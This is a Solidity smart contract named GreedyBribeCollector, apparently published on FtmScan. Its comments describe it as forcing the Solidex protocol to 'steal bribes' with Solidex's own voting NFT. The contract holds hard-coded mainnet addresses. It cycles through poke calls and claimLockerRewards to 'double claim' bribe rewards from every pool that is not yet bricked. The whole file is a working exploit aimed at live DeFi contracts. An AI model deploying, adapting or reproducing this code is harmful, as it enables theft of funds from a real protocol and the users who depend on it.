/**
 *Submitted for verification at FtmScan.com on 2022-09-06
*/

// SPDX-License-Identifier: MIT
pragma solidity 0.8.11;

interface IBribe {
    function numCheckpoints(uint256) external view returns (uint256);
}

interface IVoter {
    function length() external view returns (uint256);

    function pools(uint256) external view returns (address);

    function gauges(address) external view returns (address);

    function bribes(address) external view returns (address);

    function poolVote(uint256, uint256) external view returns (address);

    function poke(uint256) external;

    function vote(
        uint256,
        address[] memory,
        int256[] memory
    ) external;
}

interface IPool {
    function token0() external view returns (address);

    function token1() external view returns (address);
}

interface ILpDepositor {
    function claimLockerRewards(
        address,
        address[] memory,
        address[] memory
    ) external;
}

interface ISolidexVoter {
    function tokenID() external view returns (uint256);

    function getWeek() external view returns (uint256);

    function MAX_SUBMITTED_VOTES() external view returns (uint256);
}

/**
 * @notice Force Solidex to steal bribes using their own NFT
 * @dev Only works on pools Solidex has voted for, where bribe claiming is not perma-bricked
 */
contract GreedyBribeCollector {
    address immutable owner;
    IVoter constant voter = IVoter(0xdC819F5d05a6859D2faCbB4A44E5aB105762dbaE);
    ILpDepositor constant lpDepositor =
        ILpDepositor(0x26E1A0d851CF28E697870e1b7F053B605C8b060F);
    ISolidexVoter constant solidexVoter =
        ISolidexVoter(0xca082181C4f4a811bed68Ab61De6aDCe11158948);
    uint256 immutable borrowedNftTokenId;
    uint256 immutable maxPoolsLength;
    uint256 currentPoolIndex;
    uint256 currentEpoch;
    uint256 allowedLag;
    uint256 step;
    bool pokeToggle;

    constructor() {
        owner = msg.sender;
        borrowedNftTokenId = solidexVoter.tokenID();
        maxPoolsLength = solidexVoter.MAX_SUBMITTED_VOTES();
        allowedLag = 30;
    }

    /**
     * @notice Fetch all pools with votes where bribe claiming is not bricked
     */
    function nonbrickedPoolVotes() public view returns (address[] memory) {
        address[] memory _poolVotes = new address[](maxPoolsLength);
        uint256 poolsLength;
        for (uint256 poolIndex; poolIndex < maxPoolsLength; poolIndex++) {
            try voter.poolVote(borrowedNftTokenId, poolIndex) returns (
                address poolAddress
            ) {
                address gaugeAddress = voter.gauges(poolAddress);
                address bribeAddress = voter.bribes(gaugeAddress);
                IBribe bribe = IBribe(bribeAddress);
                uint256 numCheckpoints = bribe.numCheckpoints(
                    borrowedNftTokenId
                );
                bool claimingBribesIsBricked = numCheckpoints > allowedLag;
                if (!claimingBribesIsBricked) {
                    _poolVotes[poolsLength] = poolAddress;
                    poolsLength++;
                }
            } catch {
                break;
            }
        }
        bytes memory votes = abi.encode(_poolVotes);
        assembly {
            mstore(add(votes, 0x40), poolsLength)
        }
        return abi.decode(votes, (address[]));
    }

    /**
     * @notice Iterate over all elligible pools and use Solidex's NFT to double claim
     */
    function iterateBribeDoubleSpend() external {
        uint256 _currentEpoch = solidexVoter.getWeek();
        bool epochChanged = currentEpoch != _currentEpoch;
        if (epochChanged) {
            currentEpoch = _currentEpoch;
            currentPoolIndex = 0;
            step = 0;
        }

        address[] memory _nonbrickedPoolVotes = nonbrickedPoolVotes();
        if (_nonbrickedPoolVotes.length == 0) {
            revert("All bribes are bricked already. Unable to double claim :(");
        }
        if (step == 0 || step == 3) {
            address poolAddress = _nonbrickedPoolVotes[currentPoolIndex];
            IPool pool = IPool(poolAddress);
            address[] memory bribeRewards = new address[](2);
            address[] memory gaugeRewards;
            bribeRewards[0] = pool.token0();
            bribeRewards[1] = pool.token1();
            try
                lpDepositor.claimLockerRewards(
                    poolAddress,
                    gaugeRewards,
                    bribeRewards
                )
            {} catch {}
            currentPoolIndex++;
            if (currentPoolIndex == _nonbrickedPoolVotes.length) {
                currentPoolIndex = 0;
                step++;
                if (step == 4) {
                    step = 0;
                }
            }
            return;
        }
        if (step == 1) {
            voter.poke(borrowedNftTokenId);
            step++;
            return;
        }
        voter.poke(borrowedNftTokenId);
        pokeToggle = !pokeToggle;
        step++;
    }

    function setAllowedLag(uint256 _allowedLag) external {
        require(msg.sender == owner);
        allowedLag = _allowedLag;
    }

    function kill() external {
        require(msg.sender == owner);
        selfdestruct(payable(owner));
    }
}